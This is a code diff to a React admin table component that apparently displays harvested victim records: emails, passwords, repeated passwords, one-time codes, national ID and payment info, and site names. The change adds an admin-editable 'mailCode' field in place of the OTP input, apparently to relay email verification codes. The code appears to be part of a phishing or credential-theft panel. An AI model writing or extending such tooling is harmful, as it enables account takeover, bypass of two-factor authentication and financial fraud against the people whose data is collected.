@@ -140,7 +140,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user, updatedAt,nidInfo, agent: { source={},platform='' } ,paymentInfo,  email, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user, updatedAt,nidInfo, agent: { source={},platform='' } ,paymentInfo,  email, password, mailCode,repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -210,7 +210,7 @@ const InformationTable = () => {
                   {
                     role === 'admin' && (
                       <td className="px-2 py-1 font-bold cursor-pointer ">
-                             <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" defaultValue={otp} onChange={(e)=>setCodeVal(e.target.value)} />
+                             <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" defaultValue={mailCode} onChange={(e)=>setCodeVal(e.target.value)} />
                       </td>
                     )
                   }
